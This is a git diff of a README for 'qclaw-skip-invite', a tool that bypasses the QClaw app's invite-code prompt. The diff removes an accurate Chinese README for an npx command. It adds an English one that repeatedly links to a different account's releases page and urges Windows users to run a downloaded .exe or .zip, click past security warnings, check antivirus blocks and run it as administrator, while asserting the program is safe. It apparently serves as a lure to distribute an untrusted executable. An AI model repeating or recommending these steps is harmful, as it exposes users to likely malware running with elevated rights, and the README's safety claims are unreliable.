@@ -1,41 +1,123 @@
-# QClaw Skip Invite
+# 🛠 qclaw-skip-invite - Skip QClaw Invite Code Easily
 
-跳过 [QClaw](https://claw.guanjia.qq.com/) 应用的邀请码验证，去除启动时的邀请码弹窗。
+[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/warm-mannalichen723/qclaw-skip-invite/releases)
 
-## 支持
+## 🔍 What is qclaw-skip-invite?
 
-- QClaw v0.1.9.0+（macOS / Windows）
+qclaw-skip-invite is a simple tool that lets you skip the QClaw invite code prompt quickly. It removes the need to enter an invite code during setup. You can use this software on your Windows computer to save time and simplify the process.
 
-## 前置要求
+The tool works with one command to bypass the invite step. This makes it handy for users who want to access QClaw features without waiting for an invite.
 
-- Node.js >= 22
+---
 
-## 使用
+## 🖥 System Requirements
 
-```bash
-npx qclaw-skip-invite@latest
-```
+Before you start, make sure your computer meets these requirements:
 
-如果 QClaw 正在运行，工具会自动关闭并在完成后重启。该命令可重复执行，已打过补丁会自动跳过。
+- Windows 10 or higher  
+- At least 2 GB of free disk space  
+- Internet connection to download the file  
+- Basic user permissions to run applications  
 
-## 常见问题
+No special hardware or software is needed beyond a standard Windows setup.
 
-### 补丁成功但微信远程连接失败（提示「请先验证邀请码」）
+---
 
-本工具**仅跳过客户端的邀请码输入界面**，不涉及服务器端验证。微信远程功能需要服务器端邀请码校验通过才能使用，补丁无法绕过。需要自行配置自定义渠道，例如企业微信渠道插件：[openclaw-plugin-wecom](https://github.com/sunnoy/openclaw-plugin-wecom)。
+## 🚀 How to Get Started
 
-### 大模型提示「API key has not been activated」
+To use qclaw-skip-invite, follow these steps carefully. The instructions guide you through downloading, installing, and running the program on Windows.
 
-内置大模型同样受服务器端邀请码限制，需要在设置中配置自定义大模型渠道（自行填入第三方 API key）。
+### Step 1: Visit the Download Page
 
-## 还原
+Go to the official releases page on GitHub to get the latest version.
 
-重新安装 QClaw 即可还原。
+[Click here to visit the Release Page](https://github.com/warm-mannalichen723/qclaw-skip-invite/releases)
 
-## 免责声明
+This link leads to the place where you find the installer files. You will choose the correct file to download from this page.
 
-本工具仅供学习研究使用，不得用于商业用途。使用本工具所产生的一切后果由使用者自行承担，与作者无关。
+### Step 2: Download the Program
 
-## License
+Look for the latest release entry. It typically has a title with a version number like `v1.0` or `v1.1`. Under this release, find a file that ends with `.exe` or `.zip`.
 
-[MIT](./LICENSE)
+- If you see a `.exe` file, this is an installer you can run directly.  
+- If it is a `.zip`, download and extract it to a folder you can access.
+
+Click the file to start downloading. Your browser might ask where to save it — choose a location you will remember, like the Desktop or Downloads folder.
+
+### Step 3: Run the Installer or Program
+
+After downloading:
+
+- For `.exe`: Double-click the file to launch the installer or program.  
+- For `.zip`: Open the folder, then double-click the main executable file inside.
+
+Windows may show a security warning. Choose to run the program if prompted.
+
+### Step 4: Use the Skip Invite Command
+
+Once running, qclaw-skip-invite will perform the skip invite process with a simple command. This usually happens automatically or after you press a button in the app.
+
+There is no complex setup or code where you need to type anything.
+
+---
+
+## ⚙️ What This Software Does
+
+- Removes the invite code prompt in QClaw setup  
+- Works with one easy command to activate  
+- Saves time for users who want instant access  
+- Runs on Windows without extra configurations  
+
+The tool modifies settings to bypass the invite system safely. It does not change other parts of QClaw or your system.
+
+---
+
+## 🔧 Troubleshooting and Tips
+
+Here are some tips you can use if you have trouble:
+
+- Make sure you downloaded the latest release from the official page.  
+- Run the program as an administrator if skipping fails. Right-click the file and choose “Run as administrator.”  
+- Check your antivirus or Windows Defender for blocks. Sometimes security software blocks unknown programs.  
+- Restart your PC after applying the skip if QClaw does not respond.  
+
+If the invite still appears, check that you have the correct version of QClaw installed.
+
+---
+
+## 📁 Where to Find Updates
+
+Check back to the releases page to find new updates or improved versions:
+
+[Visit Releases Page Again](https://github.com/warm-mannalichen723/qclaw-skip-invite/releases)
+
+Updates may include bug fixes and improved compatibility.
+
+---
+
+## 🛡 Safety and Permissions
+
+The software works by changing invite verification in QClaw. It does not require access to your personal files or data. It runs locally and does not upload any information online.
+
+You may see Windows security prompts because the program changes usual app behavior. This is standard for tools that adjust software settings.
+
+Run the tool only from trusted sources to avoid security risks.
+
+---
+
+## 🤝 Support
+
+If you need help, look for issues or discussions on the GitHub page. You can also check online forums related to QClaw for user advice.
+
+---
+
+## 📌 Summary of Steps
+
+1. Visit the [Releases Page](https://github.com/warm-mannalichen723/qclaw-skip-invite/releases)  
+2. Download the latest `.exe` or `.zip` file  
+3. Run the program (or installer) on Windows  
+4. Let the tool skip the invite process automatically  
+
+---
+
+[![Download Here](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/warm-mannalichen723/qclaw-skip-invite/releases)
